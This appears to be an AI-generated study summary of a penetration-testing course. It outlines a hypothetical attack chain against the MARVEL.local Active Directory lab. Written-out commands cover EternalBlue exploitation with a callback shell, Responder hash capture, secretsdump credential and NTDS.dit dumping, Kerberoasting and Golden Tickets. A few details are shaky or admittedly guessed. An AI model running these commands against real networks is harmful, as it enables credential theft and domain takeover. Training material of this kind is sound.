---

## **Comprehensive Breakdown of Active Directory Attack Methodology from Course Notes** 🛡️

Based on your description and drawing upon common Active Directory attack methodologies illustrated in the sources, a potential attack path involving the compromise of user machines 'Punisher' and 'Spiderman' within the MARVEL.local domain can be constructed. However, the sources lack specifics about an attack involving machines with these names. Therefore, this breakdown presents a hypothetical attack scenario based on the provided source information, assuming 'Punisher' and 'Spiderman' are domain-joined machines within the MARVEL.local environment.

---

### **Initial Enumeration** 🔍

- **Identifying Machines:** You didn't provide specific commands from the course notes for this step. However, to identify machines like 'Punisher' and 'Spiderman' within a domain environment, common techniques include:
    - **Network Scanning:** 🖥️ Tools like `nmap` can scan IP ranges to discover active hosts. Commands such as `nmap -T4 -A -p- 192.168.164.130` (as seen in source) can provide initial reconnaissance, revealing open ports and services running on those machines.
    - **DNS Enumeration:** 🌐 Tools like `dnsrecon` can enumerate DNS records for the domain, potentially revealing hostnames like 'Punisher' and 'Spiderman' if they are registered in DNS.
- **Gathering Information:**
    - **Vulnerability Scanning:** 🛠️ Running a vulnerability scanner like Nessus can help identify weaknesses on the targeted machines ('Punisher' and 'Spiderman'). Source mentions Nessus identifying an SMBv1 vulnerability.
    - **SMB Enumeration:** 📁 Use tools like `nmap`, `smbclient`, and Metasploit modules to enumerate SMB services and shares on 'Punisher' and 'Spiderman'.
        - Commands like `nmap --script smb-protocols -p445 <IP address>` (source) can reveal the SMB version.
        - `smbclient -L \\\\\\\\<IP address>\\\\` (source) lists available shares.
        - Metasploit's `auxiliary/scanner/smb/smb_version` module (source) confirms the SMB version, essential for identifying exploitable versions like SMBv1.
    - **LDAP Enumeration:** 📜 Tools like **ldapdomaindump** can enumerate users, groups, computers, and policies within the MARVEL.local domain. The source emphasizes running `ldapdomaindump` after compromising a user to gather valuable information for further exploitation.
        - Command: `sudo /usr/bin/ldapdomaindump ldaps://<DC IP> -u 'MARVEL\\\\<username>' -p <password>`.
    - **BloodHound:** 🕵️ Use BloodHound to visually map relationships and privileges in the Active Directory environment. BloodHound analysis helps identify attack paths, including those leading to 'Punisher' and 'Spiderman'. Source suggests using BloodHound to find high-value targets and map privilege escalation paths.
- **Analyzing Outputs:** 📝 Analyze the results to build a profile of 'Punisher' and 'Spiderman'. Identify:
    - Operating systems and versions.
    - Open ports and services.
    - Vulnerable software and versions.
    - User accounts and their privileges on those machines.

---

### **Initial Access** 🔑

- **Exploiting SMBv1 Vulnerability:** 🛠️ Sources strongly suggest leveraging the EternalBlue exploit (MS17-010) to compromise a Windows machine running SMBv1.
    - The process involves using the `exploit/windows/smb/ms17_010_eternalblue` module in Metasploit.
    - **Command Sequence:**
        - `use exploit/windows/smb/ms17_010_eternalblue`
        - `set RHOSTS <target IP>`
        - `set LHOST <your IP>`
        - `set LPORT 4444`
        - `exploit`
- **LLMNR/NBT-NS Poisoning:** 🕸️ You mentioned this technique. The source describes using Responder to capture NTLMv2 hashes through LLMNR/NBT-NS poisoning.
    - Run Responder on the attacker machine: `sudo responder -I tun0 -dwp` or `sudo responder -I eth0 -wPv`.
    - Trigger LLMNR requests by attempting to access a non-existent IP address: `\\\\\\\\<attacker IP>`.
    - Responder captures the NTLMv2 hash, which can be cracked using Hashcat.
- **Credential Stuffing:** 🤖 If credential dumps from other phases reveal common or weak passwords, attempt to use them against accounts on 'Punisher' and 'Spiderman'.

---

### **Post-Exploitation** 🕵️‍♂️

- **Secretsdump:** With initial access on 'Punisher' or 'Spiderman', use `secretsdump.py` to extract additional credentials.
    - **Command Examples:**
        - `secretsdump.py MARVEL.local/fcastle:'Password1'@<target IP>`: Dumps local SAM hashes, cached domain logon info, and LSA secrets.
        - `secretsdump.py <administrator>@<target IP> -hashes <NTLM hash>`: Uses a previously acquired NTLM hash to connect and dump credentials.
- **Mimikatz:** 🗝️ Although not explicitly mentioned, if you gained local access to 'Punisher' or 'Spiderman', Mimikatz could be used to dump credentials from memory.
- **Analyzing Outputs:** 🧩 Carefully examine the output of these tools:
    - **Administrator Hashes:** 🔓 Prioritize cracking these for maximum control.
    - **Cached Credentials:** 🗂️ Look for potentially cached domain admin passwords.
    - **Cleartext Passwords:** 🗝️ Check for LSA Secrets revealing cleartext passwords.

---

### **Lateral Movement** 🚶‍♂️

- **Pass-the-Hash:** 🔄 Use acquired NTLM hashes from 'Punisher' or 'Spiderman' with tools like `secretsdump.py` or `crackmapexec` to authenticate to other machines without needing actual passwords.
- **SMB Relay Attacks:** 🌐 If SMB signing is disabled on other machines, leverage tools like `ntlmrelayx.py` to relay captured credentials and expand access.

---

### **Privilege Escalation** 📈

- **Kerberoasting:** 🔥 Use a tool like [**GetUserSPNs.py**](http://getuserspns.py/) to find service accounts with SPNs in the MARVEL.local domain:
    - **Command:** `sudo GetUserSPNs.py MARVEL.local/<username>:<password> -dc-ip <DC IP>`.
    - Crack the encrypted ticket offline using Hashcat: `hashcat -m 13100 <ticket>.kirbi <wordlist>`.
- **Token Impersonation:** 🕵️‍♀️ If an available high-privilege token is discovered on 'Punisher' or 'Spiderman', impersonate it using Metasploit's `incognito` extension.

---

### **Owning the Domain Controller** 🏆

- **Dumping the NTDS.dit:** 📂 With elevated privileges, use `secretsdump.py` to obtain the `NTDS.dit` file from the domain controller.
    - **Command:** `secretsdump.py MARVEL.local/<username>:<password>@<DC IP> -just-dc-ntlm`.
- **Cracking the Domain Admin Hash:** 🔑 Crack the NTLM hash of the domain administrator account using `hashcat` and a strong wordlist.
- **Golden Ticket Attack:** 🥇 If the domain SID and `krbtgt` hash are obtained, create a Golden Ticket with Mimikatz.

---

### **Sneaky Configurations** 🕵️‍♂️

- **Honey Pots:** 🍯 Be cautious of service accounts with a "\<never\>" LastLogon timestamp, as they might be honey pots.
- **Outdated GPP Files:** 🗃️ Check for vulnerable Group Policy files containing `cPassword` data and exploit them using Metasploit's `smb_enum_gpp` module.

---

### **Summary** 📝

1. **Initial Enumeration:** 🔍 Identify the 'Punisher' and 'Spiderman' machines and gather system information, running services, and potential vulnerabilities.
2. **Initial Access:** 🔑 Exploit a vulnerability like SMBv1 (using EternalBlue) or capture credentials via LLMNR/NBT-NS poisoning.
3. **Post-Exploitation:** 🕵️‍♂️ Use tools like `secretsdump.py` and Mimikatz to extract additional credentials.
4. **Lateral Movement:** 🚶‍♂️ Leverage techniques like Pass-the-Hash and SMB Relay attacks to move across the network.
5. **Privilege Escalation:** 📈 Identify and exploit opportunities for escalation (e.g., Kerberoasting).
6. **Owning the Domain Controller:** 🏆 Dump the `NTDS.dit`, crack the domain admin hash, or create a Golden Ticket.

**Key Points to Remember:** 🧠

- Be aware of traps like honey pots and outdated GPP files.
- The scenario is a general representation; specific commands vary by environment.
- The success of each step depends on the vulnerabilities and configurations present.

---